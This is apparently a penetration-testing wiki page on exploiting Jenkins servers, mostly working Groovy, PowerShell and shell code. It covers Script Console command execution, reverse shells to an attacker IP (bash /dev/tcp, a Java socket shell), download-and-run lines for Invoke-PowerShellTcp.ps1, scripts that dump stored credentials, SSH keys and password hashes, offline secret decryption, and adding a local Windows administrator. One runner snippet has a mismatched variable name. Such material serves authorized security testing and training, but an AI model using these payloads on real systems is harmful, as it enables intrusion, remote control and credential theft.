# Jenkins

{% hint style="info" %}
An open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Over the years, researchers have uncovered various vulnerabilities in Jenkins, including some that allow for remote code execution without requiring authentication. Jenkins is a [continuous integration](https://en.wikipedia.org/wiki/Continuous_integration) server.
{% endhint %}

## Discovery <a href="#jenkins-discovery-enumeration" id="jenkins-discovery-enumeration"></a>

* Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves.
* Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.
* **List of users**: `http://[jenkinsurl]/asynchPeople/`
* **List of all builds:** `http://[jenkinsurl]/view/All/build`s <sup><sub>(Seems to be fixed in the latest version 1.575)<sub></sup>
* **List publicly available content:** `http://[jenkinsurl]/userContent/`
* **Type of the Operating System:** `http://[jenkinsurl]/computer/`
* **Security Settings:** `http://[jenkinsurl]:8000/configureSecurity/`

## Enumeration <a href="#jenkins-discovery-enumeration" id="jenkins-discovery-enumeration"></a>

* Default credentials such as `admin:admin` or does not have any type of authentication enabled.

## Exploitation

### Groovy Script Console <a href="#script-console" id="script-console"></a>

* The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime. This can be abused to run operating system commands on the underlying server. Jenkins is often installed in the context of the root or SYSTEM account
* The script console can be reached at the URL `http:///[jenkinsurl]:8000/script`
* <pre class="language-groovy" data-line-numbers><code class="lang-groovy">// If you have Admin access (default installation before 2.x), go to:
  // http://&#x3C;jenkins_server>/script
  //Linux
  def cmd = 'id'
  def sout = new StringBuffer(), serr = new StringBuffer()
  def proc = cmd.execute()
  proc.consumeProcessOutput(sout, serr)
  proc.waitForOrKill(1000)
  println sout // println "Out> $sout Err> $serr"
  //Alternate Reverse Shell Command
  r = Runtime.getRuntime()
  p = r.exec(["/bin/bash","-c","exec 5&#x3C;>/dev/tcp/&#x3C;Attacker-IP>/&#x3C;PORT>;cat &#x3C;&#x26;5 | while read line; do \$line 2>&#x26;5 >&#x26;5; done"] as String[])
  p.waitFor()

  // Windows
  def cmd = "cmd.exe /c dir".execute();
  println("${cmd.text}");
  // Powershell command
  cmd = """ powershell "IEX(New-Object Net.WebClient).downlaodString(http://&#x3C;IP>/Invoke-PowerShellTcp.ps1')" """
  println cmd.execute().text
  // Alternate Java Reverse Shell
  String host="&#x3C;Attacker-IP>";
  int port=&#x3C;Port>;
  String cmd="cmd.exe";
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
  </code></pre>
* We can also use `exploit/multi/http/jenkins_script_console` Metasploit Module

#### Runtime Inventory

* **Run on controller:** discover real paths/versions before using filesystem or plugin-specific examples.
* <pre class="language-groovy" data-line-numbers><code class="lang-groovy">import jenkins.model.Jenkins

  def controller = Jenkins.get()
  println "Jenkins: ${Jenkins.VERSION}"
  println "JENKINS_HOME: ${controller.rootDir}"
  println "OS: ${System.getProperty('os.name')} ${System.getProperty('os.arch')}"
  println "Java: ${System.getProperty('java.version')}"
  println "Process user: ${System.getProperty('user.name')}"
  println "User home: ${System.getProperty('user.home')}"
  println "Realm: ${controller.securityRealm.class.name}"
  println "Authorization: ${controller.authorizationStrategy.class.name}"
  controller.pluginManager.plugins.each { plugin ->
    println "Plugin: ${plugin.shortName}:${plugin.version}"
  }
  controller.nodes.each { node ->
    println "Agent: ${node.nodeName}; online=${node.toComputer()?.online}"
  }
  </code></pre>
* Confirm effective OS identity using `id` / `whoami`; JVM properties alone do not describe the complete security token.

#### Shell Command Variants

* **Script Console:** choose **one** command definition, then append the shared runner in the same submission.
* **Linux:** explicit shell permits pipes/redirection; plain string `.execute()` does not.
  * ```groovy
    def command = ['/bin/sh', '-c', 'id; uname -a']
    ```
* **Windows CMD:** identity, groups, and token privileges.
  * ```groovy
    def command = ['cmd.exe', '/c', 'whoami /all']
    ```
* **Windows PowerShell:** `-Command` executes the expression; use `pwsh` only when installed.
  * ```groovy
    def command = ['powershell.exe', '-NoProfile', '-NonInteractive', '-Command', 'whoami /priv; Get-Location']
    ```
* **Reviewed local PowerShell script:** use a script already placed on the selected node; do not assume loading a function definition invokes that function.
  * ```groovy
    def command = ['powershell.exe', '-NoProfile', '-NonInteractive', '-File', '<reviewed-local-script.ps1>']
    ```
* **Shared runner:** concurrent stdout/stderr reads and a bounded wait.
  * <pre class="language-groovy" data-line-numbers><code class="lang-groovy">def process = new ProcessBuilder(command).start()
    def output = new StringBuffer()
    def errors = new StringBuffer()
    ar = process.consumeProcessOutputStream(output)
    def errorReader = process.consumeProcessErrorStream(errors)
    def finished = process.waitFor(10, java.util.concurrent.TimeUnit.SECONDS)
    if (!finished) {
      process.destroyForcibly()
      process.waitFor(2, java.util.concurrent.TimeUnit.SECONDS)
    }
    outputReader.join(1000)
    errorReader.join(1000)
    println "stdout:\n${output}"
    println "stderr:\n${errors}"
    println "completed=${finished}; exit=${process.isAlive() ? 'still running' : process.exitValue()}"
    </code></pre>
* A timeout may leave child processes or incomplete output; stop test children explicitly. Do not use this runner for long-lived listeners.
* `SeImpersonatePrivilege` is a lead, not guaranteed elevation; OS build, service configuration, token context, and tool compatibility still matter.

**Execute on a Selected Agent**

* **Need:** controller Script Console access, an in-scope online agent, and a working channel. Select the actual node name.
  * <pre class="language-groovy" data-line-numbers><code class="lang-groovy">import hudson.util.RemotingDiagnostics
    import jenkins.model.Jenkins

    def computer = Jenkins.get().getComputer('&#x3C;agent-name>')
    if (computer == null || computer.channel == null) {
      throw new IllegalStateException('Agent missing or offline')
    }
    def agentScript = '''
    println System.getProperty('os.name')
    println System.getProperty('user.name')
    println System.getProperty('user.home')
    '''
    println RemotingDiagnostics.executeGroovy(agentScript, computer.channel)
    </code></pre>
* Controller files, credentials, and OS privileges are not automatically the agent's. Repeat relevant checks in the intended context.

#### Remote Script Console

* **Host Bash/curl:** submit a reviewed local Groovy script. Requires `Overall/Administer`; this is not an authentication bypass.
* `--fail-with-body` requires curl 7.76+; use `--fail` on older versions if response-body preservation is unnecessary.
* With `--user '<username>'`, curl prompts locally; enter the approved **API token** at that prompt. Do not put live tokens in command history.
  * ```groovy
    curl --fail-with-body --user '<username>' --data-urlencode 'script@./test.groovy' '<jenkins-base-url>/scriptText'
    ```
* **API-token authentication:** exempt from Jenkins core CSRF crumbs on supported current versions.
* **Password/session authentication:** fetch a crumb and retain its matching session cookie; do not disable CSRF.
* **Host PowerShell 7+:** the credential dialog stays local. Use HTTPS and the same session for both requests.
  * <pre class="language-groovy" data-line-numbers><code class="lang-groovy">$baseUrl = 'https://jenkins.example.test/jenkins'
    $credential = Get-Credential
    $crumb = Invoke-RestMethod -Uri "$baseUrl/crumbIssuer/api/json" -Authentication Basic -Credential $credential -SessionVariable jenkinsSession
    $headers = @{}
    $headers[$crumb.crumbRequestField] = $crumb.crumb
    $scriptText = Get-Content -LiteralPath './test.groovy' -Raw
    Invoke-RestMethod -Method Post -Uri "$baseUrl/scriptText" -Authentication Basic -Credential $credential -WebSession $jenkinsSession -Headers $headers -ContentType 'application/x-www-form-urlencoded' -Body @{ script = $scriptText }
    </code></pre>
* **CLI alternative:** use the CLI JAR from the assessed instance; `groovy` also requires administrative permission. The protected auth file contains `username:API-token`; prepare it outside shell history.
  * ```groovy
    java -jar jenkins-cli.jar -s '<jenkins-base-url>/' -auth @'<protected-auth-file>' groovy = < ./test.groovy
    ```
* The CLI example uses Bash input redirection; check `help groovy` for the installed version. Delete the temporary auth file after use.
* References: [remote console](https://www.jenkins.io/doc/book/managing/script-console/#remote-access), [CSRF/session rules](https://www.jenkins.io/doc/book/security/csrf-protection/), [CLI](https://www.jenkins.io/doc/book/managing/cli/).

#### Credential Stores and Types

* **Need:** controller Script Console and the Credentials plugin. Enumerate metadata first; inspect secret values only for approved IDs.
* A root-context lookup does not cover every folder/user store. Domains, authentication, and provider context affect results; this administrative inventory does not simulate a low-privilege job.

**Inventory a Store Context**

* <pre class="language-groovy" data-line-numbers><code class="lang-groovy">import com.cloudbees.plugins.credentials.CredentialsProvider
  import jenkins.model.Jenkins

  def context = Jenkins.get()
  if (context == null) {
    throw new IllegalArgumentException('Context not found')
  }
  CredentialsProvider.lookupStores(context).each { store ->
    store.domains.each { domain ->
      store.getCredentials(domain).each { credential ->
        def identifier = credential instanceof com.cloudbees.plugins.credentials.common.IdCredentials ? credential.id : '(no ID)'
        println "store=${store.class.name}; context=${store.context}; domain=${domain.name ?: '(global)'}; id=${identifier}; type=${credential.class.name}; scope=${credential.scope}"
      }
    }
  }
  </code></pre>
* **Folder variant:** replace the `context` assignment; use a known full folder path. Inherited stores may also appear.
  * ```groovy
    def context = Jenkins.get().getItemByFullName('<folder-path>')
    ```
* **User-store variant:** replace the assignment; `false` avoids creating a user record.
  * ```groovy
    def context = hudson.model.User.getById('<user-id>', false)
    ```

**Inspect One Approved Credential**

* Use the context, domain name, and ID from inventory. For the global domain, leave `domainName` empty.
* Missing optional credential plugins are tolerated by dynamic type checks. Unknown/external providers need their own supported APIs.
* Secret-file and keystore exports below are **Base64, not encryption**; restrict and remove captured output.
* ```groovy
  import com.cloudbees.plugins.credentials.CredentialsProvider
  import jenkins.model.Jenkins

  def controller = Jenkins.get()
  def context = controller
  def domainName = ''
  def credentialId = '<approved-credential-id>'
  if (context == null) {
    throw new IllegalArgumentException('Context not found')
  }
  def matches = []
  CredentialsProvider.lookupStores(context).each { store ->
    store.domains.findAll { (it.name ?: '') == domainName }.each { domain ->
      matches.addAll(store.getCredentials(domain).findAll {
        it instanceof com.cloudbees.plugins.credentials.common.IdCredentials && it.id == credentialId
      })
    }
  }
  if (matches.size() != 1) {
    throw new IllegalStateException("Expected one match; found ${matches.size()}. Narrow the store/context.")
  }
  def credential = matches[0]
  def isType = { String className ->
    try {
      controller.pluginManager.uberClassLoader.loadClass(className).isInstance(credential)
    } catch (ClassNotFoundException ignored) {
      false
    }
  }
  if (isType('com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials')) {
    println "Username: ${credential.username}"
    println "Password: ${credential.password.getPlainText()}"
  } else if (isType('com.cloudbees.jenkins.plugins.sshcredentials.SSHUserPrivateKey')) {
    println "Username: ${credential.username}"
    println "Passphrase: ${credential.passphrase?.getPlainText() ?: '(none)'}"
    credential.privateKeys.each { privateKey -> println privateKey }
  } else if (isType('org.jenkinsci.plugins.plaincredentials.StringCredentials')) {
    println "Secret: ${credential.secret.getPlainText()}"
  } else if (isType('org.jenkinsci.plugins.plaincredentials.FileCredentials')) {
    println "Filename: ${credential.fileName}"
    credential.content.withCloseable { stream ->
      println "ContentBase64: ${stream.bytes.encodeBase64()}"
    }
  } else if (isType('com.cloudbees.plugins.credentials.common.StandardCertificateCredentials')) {
    def keyStore = credential.keyStore
    def password = credential.password.getPlainText()
    def buffer = new ByteArrayOutputStream()
    keyStore.store(buffer, password.toCharArray())
    println "KeyStoreType: ${keyStore.type}"
    println "Password: ${password}"
    println "KeyStoreBase64: ${buffer.toByteArray().encodeBase64()}"
  } else {
    println "Unsupported type: ${credential.class.name}; use the provider's documented API"
  }
  ```
* **Folder/user variants:** replace `context = controller` with the corresponding assignment from inventory; do not broaden access merely to resolve an empty result.
* `getPlainText()` is case-sensitive. SSH private-key strings are already returned as key text; applying `Secret.fromString` again is unnecessary.
* `getContent()` returns a stream; printing the stream or byte-array object does not preserve the file. Close the stream and export bytes explicitly.
* External/hardware-backed keystores may not support export. Standard file/keystore examples are not universal provider dump methods.
* APIs: [stores and lookup contexts](https://javadoc.jenkins.io/plugin/credentials/com/cloudbees/plugins/credentials/CredentialsProvider.html), [secret files](https://javadoc.jenkins.io/plugin/plain-credentials/org/jenkinsci/plugins/plaincredentials/FileCredentials.html), [certificate credentials](https://javadoc.jenkins.io/plugin/credentials/com/cloudbees/plugins/credentials/common/StandardCertificateCredentials.html).

**Secret API Round Trip**

* **Controller Script Console:** use synthetic data for an encryption/decryption control. This does not alter a stored credential.
* <pre class="language-groovy" data-line-numbers><code class="lang-groovy">import hudson.util.Secret

  def encrypted = Secret.fromString('lab-marker-only').getEncryptedValue()
  println "Encrypted: ${encrypted}"
  def recovered = Secret.decrypt(encrypted)
  println "Matches: ${recovered != null &#x26;&#x26; recovered.getPlainText() == 'lab-marker-only'}"
  </code></pre>
* **Existing encrypted value:** only for an approved `hudson.util.Secret` field with the matching controller keys.
* <pre class="language-groovy" data-line-numbers><code class="lang-groovy">import hudson.util.Secret

  def recovered = Secret.decrypt('&#x3C;encrypted-secret-value>')
  if (recovered == null) {
    throw new IllegalArgumentException('Invalid value, incompatible format, or wrong key material')
  }
  println recovered.getPlainText()
  </code></pre>
* `Secret.fromString` falls back to treating input as plaintext if decryption fails; it is not a reliable decryption-success check.
* `SecretBytes`, password hashes, and external-provider references are different formats. [Secret API](https://javadoc.jenkins.io/hudson/util/Secret.html).

#### Local User Password Hashes

* **Scope:** approved local-user records only. LDAP/SSO passwords are not recovered by these examples; a Jenkins user record need not contain a local password.
* Preserve the complete stored hash/prefix. Password hashes are not decryptable with `hudson.util.Secret`; do not assume every version/configuration uses the same hash scheme.

**Script Console: Linux or Windows**

* **Need:** compatible Jenkins user APIs and persisted user configuration. XML parsing avoids shell quoting, underscore-based username guesses, and `grep`/`cut` truncation.
* <pre class="language-groovy" data-line-numbers><code class="lang-groovy">import hudson.model.User
  import groovy.util.XmlSlurper

  def allowedIds = ['&#x3C;test-user-id>']
  User.getAll().findAll { allowedIds.contains(it.id) }.each { user ->
    def folder = user.getUserFolder()
    if (folder == null) {
      println "${user.id}: no persisted folder"
      return
    }
    def configFile = new File(folder, 'config.xml')
    if (!configFile.isFile()) {
      println "${user.id}: no config file"
      return
    }
    def config = new XmlSlurper().parse(configFile)
    def hash = config.properties.'hudson.security.HudsonPrivateSecurityRealm_-Details'.passwordHash.text()
    println "${user.id}:${hash ?: '(no local password hash)'}"
  }
  </code></pre>
* `getUserFolder()` is available from Jenkins 2.129; older releases need a verified filesystem mapping. Check the real object for null, not `"$folder"`.

#### SSH Files Outside the Credential Store

* **Script Console:** inspect the selected process's home first. The service-account path may differ from `/home/jenkins`; the credentials plugin may hold keys elsewhere.
* <pre class="language-groovy" data-line-numbers><code class="lang-groovy">def sshDirectory = new File(System.getProperty('user.home'), '.ssh')
  println "Directory: ${sshDirectory}"
  sshDirectory.listFiles()?.each { entry ->
    println "${entry.name}; file=${entry.isFile()}; readable=${entry.canRead()}"
  }
  </code></pre>
* **Approved single-file read:** validate the path and size first; preserve bytes rather than running `cat .../.ssh/*` across unrelated files.
* ```groovy
  def targetFile = new File('<approved-key-file-path>')
  if (!targetFile.isFile() || !targetFile.canRead() || targetFile.length() > 1048576) {
    throw new IllegalArgumentException('File unavailable or exceeds the 1 MiB test limit')
  }
  println targetFile.bytes.encodeBase64().toString()
  ```
* Key presence does not establish access to a remote host. Test key use only against explicitly authorized destinations; Base64 output remains sensitive.

### Project Build Configuration

* Add a build step, choose **"Execute Windows Batch Command"**
* `powershell -c <command>`
* `powershell -eX (iwr -UseBasicParsing http://<ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress <attacker-IP> -Port <attacker-port>`
* [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

**Build Execution Variants**

* **Need:** approved disposable job, configure/build permissions, and a permitted online agent. Build steps execute on the allocated node, not necessarily the controller.
* **Freestyle Linux, Execute shell:**
  * <pre class="language-bash" data-line-numbers><code class="lang-bash">id
    uname -a
    pwd
    </code></pre>
* **Freestyle Windows, Execute Windows batch command:**
  * <pre class="language-bat" data-line-numbers><code class="lang-bat">whoami /all
    cd
    </code></pre>
* **PowerShell from a Windows batch step:** no download or execution-policy change is needed for an identity check.
  * ```powershell
    powershell.exe -NoProfile -NonInteractive -Command "whoami /priv; Get-Location"
    ```
* **Scripted Pipeline:** requires Pipeline plugins; replace the label with one approved test agent. `powershell` requires Windows PowerShell; `pwsh` requires PowerShell 7 on the node.
  * <pre class="language-groovy" data-line-numbers><code class="lang-groovy">node('&#x3C;test-agent-label>') {
      timeout(time: 1, unit: 'MINUTES') {
        if (isUnix()) {
          sh 'id; uname -a; pwd'
        } else {
          bat 'whoami /all'
          powershell 'whoami /priv; Get-Location'
        }
      }
    }
    </code></pre>
* Pipeline Groovy is not the unrestricted Script Console; sandbox/script-approval rules apply. OS steps still use the agent account's permissions.
* Do not print all environment variables or bound production credentials. Review results, then restore/delete only the disposable test job and its artifacts.

### Filesystem and Host Access

#### Local Hashes from Filesystem

**Direct Filesystem: PowerShell**

* **Run on host:** approved filesystem copy or authorized local access. Set the actual Jenkins home; do not infer IDs from directory names.
* <pre class="language-groovy" data-line-numbers><code class="lang-groovy">$jenkinsHome = '&#x3C;jenkins-home-or-copy>'
  $allowedIds = @('&#x3C;test-user-id>')
  Get-ChildItem -LiteralPath (Join-Path $jenkinsHome 'users') -Directory | ForEach-Object {
    $configPath = Join-Path $_.FullName 'config.xml'
    if (-not (Test-Path -LiteralPath $configPath -PathType Leaf)) { return }
    [xml]$config = Get-Content -LiteralPath $configPath -Raw
    $idNode = $config.SelectSingleNode('/user/id')
    if ($null -eq $idNode) {
      Write-Warning "No stored ID in $configPath; resolve the user mapping first"
      return
    }
    $userId = $idNode.InnerText
    if ($allowedIds -cnotcontains $userId) { return }
    $hashNode = $config.SelectSingleNode('/user/properties/hudson.security.HudsonPrivateSecurityRealm_-Details/passwordHash')
    if ($null -ne $hashNode) {
      Write-Output "${userId}:$($hashNode.InnerText)"
    } else {
      Write-Output "${userId}: No local password hash"
    }
  }
  </code></pre>

**Direct Filesystem: Linux**

* **Need:** XMLStarlet and a known in-scope user configuration file. This reads one record, not every user.
* ```groovy
  xmlstarlet sel -t -v '/user/id' -o ':' -v '/user/properties/hudson.security.HudsonPrivateSecurityRealm_-Details/passwordHash' -n '<approved-user-config.xml>'
  ```
* Missing ID/hash: inspect the version's XML/user mapping; do not derive identity by splitting the folder name. [Jenkins user API](https://javadoc.jenkins.io/hudson/model/User.html).

#### Offline Secret Decryption

* **Tool:** [hoto/jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor) is **Go**, not Python. Use a reviewed release compatible with the captured format.
* **Required matching artifacts:** encrypted credential XML, `secrets/master.key`, and `secrets/hudson.util.Secret` from the same key state. Work on protected copies; never replace live keys for this test.
* Global credentials commonly use `credentials.xml`; folder credentials may be in the folder's `config.xml`. Locate the actual store first.
* A changed/lost key is not bypassed by offline mode; historical ciphertext requires its corresponding key material.
* <pre class="language-bash" data-line-numbers><code class="lang-bash">./jenkins-credentials-decryptor --help
  ./jenkins-credentials-decryptor --version
  ./jenkins-credentials-decryptor -m ./master.key -s ./hudson.util.Secret -c ./credentials.xml -o json
  ./jenkins-credentials-decryptor -m ./master.key -s ./hudson.util.Secret -c ./folder-config.xml -o json
  </code></pre>
* The last two lines are separate global/folder input variants. The tool's documented compatibility is limited; verify a known test secret and handle unsupported credential formats separately.

#### Optional Windows Account Test

* **Separate approval required:** state-changing OS test, not a Jenkins prerequisite or automatic privilege escalation.
* **Run directly in an interactive, already elevated Windows PowerShell console:** 64-bit `Microsoft.PowerShell.LocalAccounts` module, local accounts supported, and a fresh test name. This is not a Script Console prompt workflow.
* Create a test account; enter its password only at the local secure prompt. This does not create a Jenkins user.
* <pre class="language-groovy" data-line-numbers><code class="lang-groovy">$testUser = 'JenkinsLabTest'
  if (Get-LocalUser -Name $testUser -ErrorAction SilentlyContinue) { throw 'Test name already exists' }
  $testPassword = Read-Host 'Temporary test password' -AsSecureString
  New-LocalUser -Name $testUser -Password $testPassword -Description 'Temporary authorized Jenkins assessment'
  $administrators = Get-LocalGroup -SID 'S-1-5-32-544'
  Add-LocalGroupMember -Group $administrators.Name -Member (Get-LocalUser -Name $testUser)
  Get-LocalGroupMember -Group $administrators.Name
  </code></pre>
* <pre class="language-groovy" data-line-numbers><code class="lang-groovy">$testUser = 'JenkinsLabTest'
  $administrators = Get-LocalGroup -SID 'S-1-5-32-544'
  Remove-LocalGroupMember -Group $administrators.Name -Member (Get-LocalUser -Name $testUser)
  Remove-LocalUser -Name $testUser
  Remove-Variable testPassword -ErrorAction SilentlyContinue
  </code></pre>
